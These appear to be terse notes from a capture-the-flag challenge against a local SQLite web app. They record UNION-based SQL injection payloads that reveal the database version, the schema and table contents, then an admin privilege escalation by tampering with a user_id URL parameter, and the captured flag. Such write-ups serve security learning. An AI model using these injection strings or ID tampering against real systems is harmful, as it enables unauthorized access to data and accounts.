---
created: 2026-03-07T11:27
updated: 2026-03-07T11:38
---

|        | `w' union select sqlite_version(), 0 --` |
| ------ | ---------------------------------------- |
| 3.46.1 | 0                                        |

|                 | `w' union select name,sql from sqlite_master where  type='table' --`         |
| --------------- | ---------------------------------------------------------------------------- |
| archives        | CREATE TABLE archives ( id INTEGER PRIMARY KEY AUTOINCREMENT, content TEXT ) |
| sqlite_sequence | CREATE TABLE sqlite_sequence(name,seq)                                       |
| users           | CREATE TABLE users ( user_id INTEGER PRIMARY KEY, clearance_role TEXT )      |

|     | `w' union select * from archives --`                    |
| --- | ------------------------------------------------------- |
| 1   | Transmission log alpha - Xyrathian deep space relay     |
| 2   | Signal intercept beta - Communication protocol analysis |
| 3   | Telemetry data gamma - Navigation system diagnostics    |
| 4   | Sensor readings delta - Atmospheric composition scan    |
| 5   | Power grid status - Energy distribution metrics         |
| 6   | Propulsion logs - Thruster calibration records          |

| ID   | `w' union select * from users --` |
| ---- | --------------------------------- |
| 1001 | guest                             |
| 1002 | guest                             |
| 1003 | guest                             |
| 1004 | guest                             |
| 1005 | guest                             |
| 1006 | guest                             |
| 1007 | guest                             |
| 1008 | guest                             |
| 1009 | guest                             |
| 1010 | guest                             |
| 5847 | admin                             |

Cookie session id `3e9` = `1001`.

But changing it to 5847 doesn't work.

But...

`http://127.0.0.1:45587/dashboard?user_id=5847`
changing url works???

```flag
ATHACKCTF{c00k13_pr1v_3sc4l4t10n}
```
